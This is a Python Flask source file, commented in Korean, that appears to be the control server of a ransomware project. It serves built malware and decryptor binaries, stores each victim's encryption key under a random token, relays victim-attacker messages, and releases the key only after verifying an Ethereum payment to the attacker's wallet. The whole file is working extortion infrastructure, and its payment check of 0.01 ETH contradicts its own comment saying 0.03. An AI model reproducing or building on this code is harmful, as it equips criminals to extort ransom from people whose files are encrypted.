from flask import Flask
from flask import request, send_file
from Database import Database
import random
import time
import os
from web3 import Web3
from money import account 

app = Flask(__name__)
etheremum_address = "account"

infura_url = 'https://rpc.sepolia.org'
web3 = Web3(Web3.HTTPProvider(infura_url))

db = Database("./database/db.json")

# 헬로 월드 보여주는 놈
@app.route('/')
def hello_world():
    return 'Hello, World!'

# Decryptor 바이너리 반환
# 언제? 관리자가 코인을 받았을 때만 다운로드 가능
@app.route("/get_decryptor")
def get_decryptor():
    os.system("pyinstaller --onefile decryptor_template.py")
    return send_file("./dist/decryptor_template", as_attachment=True)

# Malware 생성 후 다운로드
@app.route("/gen_malware")
def gen_malware():
    os.system("pyinstaller --onefile malware_template.py")
    return send_file("./dist/malware_template", as_attachment=True)

# malware에서 key를 서버에 저장
# 서버는 token을 랜덤하게 생성하고, DB에 저장한 뒤 token 반환
# /save_token?key={16bytes_key}
@app.route("/save_token")
def save_token():
    key = request.args.get("key")
    token = random.randint(1000000000, 9999999999)
    db.set(key=token, value={
        # 암호화에 사용된 키 (16bytes)
        "key": key,
        # 이더리움을 보낼 주소
        "etheremum_address": etheremum_address,
        # 만들어진 시간
        "created_at": time.time(),
        # 돈을 지불 했는지?
        "is_paid": False,
        # 채팅 메시지
        "messages": []
    })
    return {
        "status" : False,
        "token": token,
        "created_at": time.time(),
        "etheremum_address": etheremum_address
    }

# 현재 상황을 보여주는 페이지 (악성코드 별)
# /information?token={token}
# token = /save_token에서 받은 token
@app.route("/information")
def information():
    pass

# malware 피해자가 공격자에게 메시지를 보낼 때 사용
# 단순히 DB에 저장합시다
# /send_msg?token={token}&msg={msg}
# token = /save_token에서 받은 token
# msg = 보낼 메시지
@app.route("/send_msg")
def send_msg():
    token = request.args.get("token")
    data = db.get(key=token)
    print(data)

    msg = request.args.get("msg")
    data["messages"] = data.get("messages", [])
    data["messages"].append(msg)
    
    db.set(token, data)
    return {
        "messages": data["messages"]
    }
# 현재 메시지 목록을 반환합니다.
# 단순히 DB에서 뽑아옵니다.
# /get_msg?token={token}
# token = /save_token에서 받은 token
@app.route("/get_msg")
def get_msg():
    token = request.args.get("token")
    data = db.get(token)
    return {
        "messages": data["messages"]
    }

# 키를 반환합니다.
# Decryptor가 키를 요청할 때 사용합니다.
# @app.route("/get_key")
# def get_key():
#     token = request.args.get("token")
#     data = db.get(token)
#     if data["is_paid"] == False:
#         return {
#             "status": False,
#             "error": "Not paid"
#         }
#     return {
#         "status": True,
#         "key": data.get("key", "")
#     }

# 이더리움 transaction 사용
# /get_key?token={token}&txid={이더리움 주소}

@app.route("/get_key")
def get_key():
    token = request.args.get("token")
    x = db.get(token)
    if not db.exists(token):
        return {"invalid token"}
    
    # 1. txid를 받아와 수금이 끝났는지 확인.
    txid = request.args.get("txid")

    # 1.5 token 의 status가 True이면 바로 키 반환
    if x["is_paid"]:
        return {
            "key": x["key"]
        }
    
    # 2. txid 정보 가져오기
    transaction = web3.eth.get_transaction(txid)
    if transaction is None:
        return {"error": "Invalid txid"}
    
    # 3. 이미 사용된 txid면 키 반환 x
    if db.get(txid):
        return {"error": "Already used txid"}

    # 4. 0.03 ETH 이상이면 키 반환
    dict_transaction = dict(transaction)
    if float(web3.from_wei(dict_transaction["value"], "ether")) < 0.01: 
        return "not enough!"
    
    # 5. TO가 내 이더리움 지갑 주소인지 확인
    if dict_transaction["to"] != etheremum_address:
        return "not my address!"


    # 6. txid를 token으로 저장
    db.set(txid, True)

    # 7. token의 is_paid를 True로 변경
    x["is_paid"] = True
    db.set(token, x)

    return {
        "key" : x["key"]
    }
    

@app.route("/dashboard")
def dashboard():
    balance = web3.eth.get_balance(etheremum_address)
    #이더리움 네트워크에서 해커의 balance를 가져오세요
    return {
        "balance": balance
    }


if __name__ == '__main__':
    app.run(debug=True)